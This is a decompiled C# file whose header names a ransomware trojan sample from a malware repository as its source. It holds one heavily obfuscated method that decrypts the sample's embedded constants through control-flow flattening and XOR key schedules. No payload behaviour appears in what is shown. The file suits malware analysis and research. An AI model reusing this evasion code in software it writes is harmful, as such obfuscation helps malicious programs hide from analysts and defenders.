// Decompiled with JetBrains decompiler
// Type: h1hj��B��~�F
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79CC5886-3FF3-4BA2-A3E6-9E50089A921D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-5a26181f2f36991d9055db38b70c0df2d166b99d1714fb7a14978e2e0420b71d.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \u000Dh1hj\uFFFD\uFFFDB\uFFFD\uFFFD\u007E\u0002\u000F\uFFFDF\u0011
{
  static object \u0026\uFFFD\uFFFD\uFFFDӊS\u000A\uFFFDz9o2\uFFFD\uFFFD\u0013(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = ----7;
    uint num3;
    object obj;
    Stream 밬뻫曆轠閼೮;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        int num10;
        do
        {
          switch (num2)
          {
            case 1:
              goto label_4;
            case 2:
              goto label_5;
            case 3:
              goto label_6;
            case 4:
              goto label_7;
            case 5:
              goto label_9;
            case 6:
              goto label_10;
            case 7:
              goto label_11;
            case 8:
              goto label_12;
            case 9:
              goto label_13;
            case 10:
              goto label_14;
            case 11:
              goto label_15;
            case 12:
              goto label_17;
            case 13:
              goto label_20;
            case 14:
              goto label_21;
            case 15:
              goto label_23;
            case 16:
              goto label_27;
            case 17:
              goto label_28;
            case 18:
              goto label_29;
            case 19:
            case 21:
              goto label_30;
            case 20:
              goto label_32;
            default:
              num10 = (int) num4;
              num2 = 7 - (--7 + (4 - 8));
              continue;
          }
        }
        while ((uint) num10 >= 32U);
        num2 = ~~(-~6 - -13);
        continue;
label_4:
        num5 ^= (uint) (((int) ((num6 & 16711680U) >> 16) | ~((int) num6 & (int) byte.MaxValue)) * (~(int) num6 & 16711680));
        num2 = 3 - ~--12;
        continue;
label_5:
        ++num7;
        num2 = --24 + -5;
        continue;
label_6:
        num6 -= (uint) (~((int) num5 ^ (int) num8) + 1539703469);
        num2 = -(4 - ~-7);
        continue;
label_7:
        if (num4 >= 32U && num4 < 48U)
        {
          num2 = -~(9 - ~(5 - 6));
          continue;
        }
        if (num4 >= 48U)
        {
          num9 = (int) num4;
          num2 = 7 - ~-6;
          continue;
        }
        goto label_5;
label_9:
        num5 = 860970426U;
        num8 = 68798595U;
        num7 = 1U;
        num2 = ~(-21 - (4 - 3));
        continue;
label_10:
        num8 += num6 * num7 % 32U;
        num2 = --(4 - -4);
        continue;
label_11:
        num6 = 967702381U ^ num1;
        num2 = -(-4 - (8 - 7));
        continue;
label_12:
        num6 |= (uint) ((int) num5 + ~(int) num8 & 1539703469);
        num2 = --~-10;
        continue;
label_13:
        num2 = ~---3;
        continue;
label_14:
        num5 += (uint) (((int) num6 & (int) byte.MaxValue | (int) ((num6 & 16711680U) >> 16)) + (~(int) num6 & (int) byte.MaxValue));
        num2 = -7 - (4 + (7 + 9) - 42);
        continue;
label_15:
        if (!\u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦.TryGetValue(num3, out obj))
        {
          Monitor.Enter((object) (밬뻫曆轠閼೮ = \u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮));
          goto label_34;
        }
        else
          goto label_62;
label_17:
        num6 += (uint) (((int) num5 | (int) num8) ^ 1539703469);
        goto label_5;
label_20:
        num8 ^= (uint) ((int) num6 * (int) num7 + 1) % 16U;
        num2 = -(-~9 - 26 + (2 + 2));
        continue;
label_21:
        num4 = (num6 & (uint) byte.MaxValue) % 64U;
        if (num4 < 0U || num4 >= 16U)
        {
          int num11 = (int) num4;
          num2 = -~--3;
          if ((uint) num11 >= 16U)
          {
            num2 = -(--14 - (5 + 9));
            continue;
          }
          continue;
        }
        num2 = -(-12 + ~4);
        continue;
label_23:
        num8 -= (uint) ~((int) num6 + (int) num4) % 48U;
        num6 ^= num5 % num8 | 1539703469U;
        goto label_5;
      }
      while ((uint) num9 >= 64U);
      num2 = -(--~3 - ~2);
      continue;
label_27:
      num8 += (num6 ^ num7 - 1U) % num4;
      num2 = ~(--3 + -7);
      continue;
label_28:
      num5 |= (uint) ((int) ((num6 & 65280U) >> 8) & (int) ((num6 & 16711680U) >> 16) ^ ~(int) num6 & (int) byte.MaxValue);
      num2 = ~2 - 6 - -31 + ~8;
      continue;
label_29:
      num3 = num6 ^ b;
      num2 = --13 - 2;
      continue;
label_30:
      if (num7 > 64U)
      {
        num2 = ~(9 - 2 - (7 + 2) - 20) - 3;
        continue;
      }
      num6 = (uint) (((int) num6 & 16777215) << 8) | (num6 & 4278190080U) >> 24;
      num2 = ~-(23 - 8);
      continue;
label_32:
      num5 ^= (uint) (((int) num6 & 16711935) << 8 ^ ((int) ((num6 & 16776960U) >> 8) | ~(int) num6 & (int) ushort.MaxValue));
      num2 = -~(-11 - (~4 - (5 + 6)));
    }
label_34:
    byte num12;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.밬뻫曆\uF5B7轠\uF2F8閼೮);
      int num13 = 5 - 5;
      while (true)
      {
        switch (num13)
        {
          case 1:
            num12 = binaryReader.ReadByte();
            num13 = -16 - -(6 + 7) - 4 + 9;
            continue;
          case 2:
            bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
            num13 = 4 - (~7 + (8 + 5)) - ~5 - 2;
            continue;
          case 3:
            goto label_40;
          default:
            binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
            num13 = -(~7 + 7);
            continue;
        }
      }
    }
    finally
    {
      Monitor.Exit((object) 밬뻫曆轠閼೮);
    }
label_40:
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876214 ^ currentMethod.MetadataToken);
    uint num14 = (uint) (((int) num3 + (int) num12) * 1494844765);
    int num15 = ~-11 - -2 - 5;
    while (true)
    {
      ushort num16;
      ushort num17;
      int index;
      int num18;
      do
      {
        ushort num19;
        ushort num20;
        int num21;
        do
        {
          switch (num15)
          {
            case 1:
              num15 = -(-6 - (--7 - 1));
              continue;
            case 2:
              obj = (object) BitConverter.ToDouble(bytes, 0);
              num15 = ~~--1;
              continue;
            case 3:
              if (num12 == (byte) 117)
              {
                obj = (object) BitConverter.ToSingle(bytes, 0);
                num15 = --(13 - -(3 - 4));
                continue;
              }
              goto case 8;
            case 4:
              num19 = num16;
              num15 = ~~(28 - (8 + 4 + (2 + 4)));
              continue;
            case 5:
              obj = (object) BitConverter.ToInt64(bytes, 0);
              num15 = 4 - -~-6;
              continue;
            case 6:
              obj = (object) Encoding.UTF8.GetString(bytes);
              num15 = ~(~8 - (7 - 3));
              continue;
            case 7:
              num20 = (ushort) (num14 >> 16);
              num15 = -(-8 - -8);
              continue;
            case 8:
              num21 = (int) num12;
              num15 = ~---17;
              continue;
            case 9:
            case 12:
              goto label_57;
            case 10:
              goto label_55;
            case 11:
            case 13:
              goto label_58;
            case 14:
              goto label_61;
            case 15:
              goto label_62;
            case 16:
              goto label_63;
            case 17:
              goto label_65;
            case 18:
              goto label_66;
            default:
              num16 = (ushort) (num14 & (uint) ushort.MaxValue);
              num15 = 9 - (~8 - (7 - 21));
              continue;
          }
        }
        while (num21 != 11);
        num15 = ~(-34 - (5 + 2 - (9 + 6)) + 7);
        continue;
label_55:
        num17 = num20;
        num15 = -9 - (~(6 + 6) - 22) - 9;
        continue;
label_57:
        \u003CModule\u003E.삗潭늙ꛀ\u0E67\uFFFD\u2F42醦[num3] = obj;
        num15 = -~--14;
        continue;
label_58:
        if (index < bytes.Length)
        {
          bytes[index] ^= (byte) ((num14 * (uint) num19 + (uint) num17) % 256U ^ (uint) numArray[index % 8]);
          num19 = (ushort) ((num14 * (uint) num19 + (uint) num20) % 65536U);
          num15 = --26 - (7 + 5);
          continue;
        }
        num18 = (int) num12;
        num15 = 3 - (-9 - ~(8 - 3) - ~2);
        continue;
label_63:
        if (num12 != (byte) 50)
        {
          int num22 = (int) num12;
          num15 = 16 - (7 + (6 - 9));
          if (num22 == 27)
            num15 = ~---7;
        }
        else
          goto label_64;
      }
      while (num18 != 152);
      num15 = --(--7 - 5);
      continue;
label_61:
      num17 = (ushort) ((num14 * (uint) num17 + (uint) num16) % 65536U);
      ++index;
      num15 = ~(-27 - (~7 + -9)) + 4;
      continue;
label_64:
      num15 = -(7 - ~-13);
      continue;
label_65:
      index = 0;
      num15 = -7 - -(7 + 9) - -2;
      continue;
label_66:
      obj = (object) BitConverter.ToInt32(bytes, 0);
      num15 = ~-(--6 - -7);
    }
label_62:
    return obj;
  }
}
